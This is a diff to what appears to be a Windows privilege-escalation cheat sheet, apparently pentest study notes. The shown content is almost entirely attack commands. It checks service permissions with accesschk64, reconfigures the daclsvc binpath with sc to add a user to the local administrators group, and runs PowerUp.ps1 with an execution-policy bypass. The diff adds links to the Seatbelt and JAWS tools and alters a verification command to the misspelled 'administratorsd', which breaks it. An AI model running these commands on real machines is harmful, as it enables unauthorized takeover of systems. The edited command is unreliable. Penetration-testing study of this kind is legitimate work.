@@ -288,7 +288,7 @@ accesschk64.exe -uwcv Everyone * <checking binpath permission everywhere>
 C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
 sc config daclsvc binpath= "net localgroup administrators user /add"
 sc start daclsvc
-net localgroup administrators
+net localgroup administratorsd
 
 ```
 
@@ -319,6 +319,9 @@ Invoke-Allchecks
 Directly run like this:
 add "Invoke-Allchecks" in end the script of PowerUP.ps1 script or any other script  
 powershell -ep bypass .\PowerUp.ps1
+
+https://github.com/GhostPack/Seatbelt
+https://github.com/411Hall/JAWS
 ```
 
 
